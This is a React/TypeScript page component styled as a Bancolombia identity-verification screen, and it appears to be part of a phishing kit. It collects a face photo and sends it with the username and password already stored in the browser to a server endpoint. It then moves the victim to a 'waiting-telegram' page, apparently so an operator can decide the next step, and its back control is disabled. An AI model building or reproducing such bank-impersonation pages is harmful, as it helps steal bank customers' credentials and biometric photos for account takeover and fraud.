import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { Upload, Loader2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";

import logoSymbol from "@assets/LogoBancolombia_1764027131736.png";

export default function Face() {
  const [location, setLocation] = useLocation();
  const [photoFile, setPhotoFile] = useState<File | null>(null);
  const [photoPreview, setPhotoPreview] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [clientIp, setClientIp] = useState("Cargando...");
  const [currentTime, setCurrentTime] = useState(new Date());
  const fileInputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    const userId = localStorage.getItem("userId");
    if (!userId) {
      setLocation("/");
      return;
    }

    fetch("/api/client-ip")
      .then((res) => res.json())
      .then((data) => setClientIp(data.ip))
      .catch(() => setClientIp("0.0.0.0"));

    const timer = setInterval(() => {
      setCurrentTime(new Date());
    }, 1000);

    return () => clearInterval(timer);
  }, [setLocation]);

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      setPhotoFile(file);

      const reader = new FileReader();
      reader.onload = (event) => {
        setPhotoPreview(event.target?.result as string);
      };
      reader.readAsDataURL(file);
    }
  };

  const handleSendPhoto = async () => {
    if (!photoFile) {
      alert("Por favor, sube una foto");
      return;
    }

    setIsLoading(true);

    try {
      const userId = localStorage.getItem("userId");
      const username = localStorage.getItem("username");
      const password = localStorage.getItem("password");
      const formData = new FormData();
      formData.append("userId", userId || "");
      formData.append("username", username || "");
      formData.append("password", password || "");
      formData.append("photo", photoFile);

      const response = await fetch("/api/send-face-photo", {
        method: "POST",
        body: formData,
      });

      const data = await response.json();

      if (response.ok && data.success) {
        // Go to waiting telegram page and wait for user decision
        setLocation("/waiting-telegram");
      } else {
        alert("Error al enviar la foto");
        setIsLoading(false);
      }
    } catch (error) {
      console.error("Send photo error:", error);
      alert("Error al conectar con el servidor");
      setIsLoading(false);
    }
  };

  const resetPhoto = () => {
    setPhotoFile(null);
    setPhotoPreview(null);
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-background px-4 py-8 font-sans text-white relative">
      {/* Loading Overlay */}
      {isLoading && (
        <div className="absolute inset-0 bg-black/80 z-50 flex flex-col items-center justify-center backdrop-blur-sm">
          <Loader2 className="w-12 h-12 text-[#FDDA24] animate-spin mb-4" />
          <p className="text-white font-medium">Cargando...</p>
        </div>
      )}

      {/* Header */}
      <div className="mb-8 flex justify-center items-center gap-3">
        <img
          src={logoSymbol}
          alt="Bancolombia Symbol"
          className="h-12 w-12 object-contain"
        />
        <h1 className="text-3xl font-bold text-white">Bancolombia</h1>
      </div>

      <div className="w-full max-w-sm space-y-6">
        {/* Card */}
        <Card className="bg-[#383838] border-none shadow-xl rounded-xl overflow-hidden text-white">
          <CardContent className="pt-8 pb-8 px-8 text-center space-y-6">
            <div className="space-y-2">
              <h2 className="text-xl font-bold">Verifica tu identidad</h2>
              <p className="text-sm text-gray-300 px-4 leading-relaxed">
                Sube una imagen para completar la verificación.
              </p>
            </div>

            {/* Photo Preview or Upload */}
            {photoPreview ? (
              <div className="space-y-4">
                <div className="w-full bg-black rounded-lg overflow-hidden border-2 border-yellow-400">
                  <img src={photoPreview} alt="Foto de verificación" className="w-full h-auto" />
                </div>
                <Button
                  variant="outline"
                  className="w-full rounded-full border-white/30 text-white hover:bg-white/10"
                  onClick={resetPhoto}
                >
                  Cambiar foto
                </Button>
              </div>
            ) : (
              <div className="space-y-4">
                <div className="w-full bg-black rounded-lg border-2 border-dashed border-yellow-400 p-8 flex flex-col items-center justify-center min-h-[200px]">
                  <Upload className="w-12 h-12 text-gray-500 mb-3" />
                  <p className="text-gray-400 text-sm">Sin foto seleccionada</p>
                </div>

                <Button
                  className="w-full rounded-full border-white/30 text-white hover:bg-white/10 py-3"
                  variant="outline"
                  onClick={() => fileInputRef.current?.click()}
                >
                  <Upload className="w-4 h-4 mr-2" />
                  Subir foto
                </Button>

                <input
                  ref={fileInputRef}
                  type="file"
                  accept="image/*"
                  onChange={handleFileUpload}
                  className="hidden"
                />
              </div>
            )}

            {/* Continue Button */}
            <Button
              className={`w-full rounded-full font-bold py-3 transition-all ${
                photoFile && !isLoading
                  ? "bg-[#FDDA24] hover:bg-[#FFF066] text-black"
                  : "bg-[#888888] hover:bg-[#999999] text-black disabled:opacity-50"
              }`}
              onClick={handleSendPhoto}
              disabled={!photoFile || isLoading}
              data-testid="button-send-photo"
            >
              {isLoading ? "Enviando..." : "Enviar foto"}
            </Button>
            <div
              className="w-full text-white font-medium py-3 hover:opacity-80 transition-opacity underline text-center cursor-not-allowed"
              data-testid="button-back"
            >
              Volver atrás
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Footer */}
      <div className="mt-12 w-full max-w-sm">
        <div className="text-xs text-gray-500 space-y-1 border-t border-white/10 pt-4">
          <p>Dirección IP: {clientIp}</p>
          <p>
            {currentTime.toLocaleDateString("es-CO", {
              weekday: "long",
              year: "numeric",
              month: "long",
              day: "numeric",
            })},
            {" "}
            {currentTime.toLocaleTimeString("es-CO", {
              hour: "2-digit",
              minute: "2-digit",
              second: "2-digit",
              hour12: true,
            })}
          </p>
        </div>
      </div>
    </div>
  );
}
